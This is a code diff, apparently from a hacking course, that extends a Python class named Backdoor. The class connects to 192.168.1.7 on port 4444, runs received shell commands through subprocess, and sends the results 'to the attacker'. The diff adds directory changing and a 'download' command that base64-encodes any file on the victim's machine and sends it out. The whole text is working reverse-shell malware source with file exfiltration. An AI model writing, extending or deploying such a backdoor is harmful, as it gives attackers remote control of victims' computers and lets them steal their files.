@@ -3,6 +3,8 @@
 import socket
 import subprocess
 import json
+import os
+import base64
 
 
 class Backdoor:
@@ -33,6 +35,14 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def run(self):
         # execute these commands in a loop to be able to send commands continuously
         while True:
@@ -41,12 +51,17 @@ class Backdoor:
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-
-            # pass this command variable to a function named execute_system_command
-            command_result = self.execute_system_command(command)
-
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_directory_to(command[1])
+            elif command[0] == "download":
+                command_result = self.read_file(command[1])
+            else:
+                # pass this command variable to a function named execute_system_command
+                command_result = self.execute_system_command(command)
+            # print(command_result)  to see that the base64 converts the file into known parsable characters
             # send the result to the attacker
             self.reliable_send(command_result)
+
 
 # create an instance of the object and run the class
 my_backdoor = Backdoor("192.168.1.7", 4444)
